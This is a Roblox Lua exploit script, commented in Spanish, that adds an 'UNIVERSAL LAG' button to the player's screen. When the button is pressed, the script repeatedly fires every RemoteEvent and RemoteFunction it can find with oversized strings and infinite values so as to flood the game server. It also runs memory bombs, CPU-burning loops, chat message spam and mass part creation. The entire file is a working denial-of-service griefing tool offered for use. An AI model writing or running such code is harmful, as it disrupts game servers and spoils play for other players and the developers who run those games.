local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local lagActive = false
local connections = {}

-- GUI (igual que antes)
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "UniversalLag"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 200, 0, 100)
frame.Position = UDim2.new(0, 10, 1, -110)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BorderSizePixel = 0
frame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 8)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.BackgroundTransparency = 1
title.Text = "UNIVERSAL LAG"
title.TextColor3 = Color3.fromRGB(255, 100, 100)
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.Parent = frame

local button = Instance.new("TextButton")
button.Size = UDim2.new(0.9, 0, 0, 40)
button.Position = UDim2.new(0.05, 0, 0, 50)
button.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
button.Text = "ACTIVATE LAG"
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.TextScaled = true
button.Font = Enum.Font.Gotham
button.Parent = frame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 4)
buttonCorner.Parent = button

-- Métodos más universales
local function universalRemoteSpam()
    return RunService.Heartbeat:Connect(function()
        if not lagActive then return end
        
        -- Buscar TODOS los remotes en el juego
        local function spamRemotes(parent)
            for _, obj in pairs(parent:GetChildren()) do
                if obj:IsA("RemoteEvent") then
                    spawn(function()
                        for i = 1, 200 do
                            pcall(function()
                                obj:FireServer(
                                    string.rep("LAG", 2000),
                                    math.huge,
                                    Vector3.new(math.huge, math.huge, math.huge),
                                    CFrame.new(math.huge, math.huge, math.huge),
                                    workspace,
                                    player,
                                    {}
                                )
                            end)
                        end
                    end)
                elseif obj:IsA("RemoteFunction") then
                    spawn(function()
                        for i = 1, 100 do
                            pcall(function()
                                obj:InvokeServer(string.rep("X", 5000))
                            end)
                        end
                    end)
                end
                
                if obj:GetChildren() then
                    spamRemotes(obj)
                end
            end
        end
        
        spamRemotes(ReplicatedStorage)
        spamRemotes(workspace)
        spamRemotes(game.StarterPack)
    end)
end

local function memoryBomb()
    return RunService.Heartbeat:Connect(function()
        if not lagActive then return end
        
        -- Crear tablas masivas que consumen RAM
        spawn(function()
            local bigData = {}
            for i = 1, 50000 do
                bigData[i] = {
                    data = string.rep("LAGBOMB", 500),
                    numbers = {},
                    nested = {}
                }
                
                for j = 1, 100 do
                    bigData[i].numbers[j] = math.random() * 999999
                    bigData[i].nested[j] = string.rep(tostring(math.random()), 50)
                end
            end
        end)
    end)
end

local function cpuKiller()
    return RunService.Heartbeat:Connect(function()
        if not lagActive then return end
        
        -- Múltiples threads de cálculos intensivos
        for thread = 1, 20 do
            spawn(function()
                for i = 1, 10000 do
                    local result = 0
                    for j = 1, 1000 do
                        result = result + math.sin(i) * math.cos(j) * math.tan(i+j)
                        result = result ^ 0.5
                        result = math.floor(result * math.random())
                    end
                end
            end)
        end
    end)
end

local function networkFlooder()
    return RunService.Heartbeat:Connect(function()
        if not lagActive then return end
        
        -- Intentar múltiples métodos de red
        spawn(function()
            -- Método 1: Chat spam (si está disponible)
            pcall(function()
                for i = 1, 100 do
                    game.StarterGui:SetCore("ChatMakeSystemMessage", {
                        Text = string.rep("LAG", 1000);
                        Color = Color3.fromRGB(255, 0, 0);
                        Font = Enum.Font.Gotham;
                        FontSize = Enum.FontSize.Size18;
                    })
                end
            end)
            
            -- Método 2: Bindable events
            pcall(function()
                local bindable = Instance.new("BindableEvent")
                for i = 1, 1000 do
                    bindable:Fire(string.rep("DATA", 1000))
                end
                bindable:Destroy()
            end)
        end)
    end)
end

local function tryCreateObjects()
    return RunService.Heartbeat:Connect(function()
        if not lagActive then return end
        
        -- Intentar crear objetos donde sea posible
        local locations = {workspace, player.PlayerGui, player.Backpack}
        
        for _, location in pairs(locations) do
            spawn(function()
                pcall(function()
                    for i = 1, 100 do
                        local part = Instance.new("Part")
                        part.Name = "LagPart" .. tick()
                        part.Size = Vector3.new(0.1, 0.1, 0.1)
                        part.Transparency = 1
                        part.CanCollide = false
                        part.Anchored = true
                        part.Position = Vector3.new(math.random(-5000, 5000), math.random(1000, 5000), math.random(-5000, 5000))
                        part.Parent = location
                        
                        game:GetService("Debris"):AddItem(part, 0.1)
                    end
                end)
            end)
        end
    end)
end

local function toggleLag()
    lagActive = not lagActive
    
    if lagActive then
        button.Text = "STOP LAG"
        button.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
        
        -- Activar todos los métodos
        table.insert(connections, universalRemoteSpam())
        table.insert(connections, memoryBomb())
        table.insert(connections, cpuKiller())
        table.insert(connections, networkFlooder())
        table.insert(connections, tryCreateObjects())
        
        warn("UNIVERSAL LAG ACTIVATED!")
    else
        button.Text = "ACTIVATE LAG"
        button.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        
        for _, connection in pairs(connections) do
            if connection then
                connection:Disconnect()
            end
        end
        connections = {}
        
        print("Lag stopped")
    end
end

button.MouseButton1Click:Connect(toggleLag)
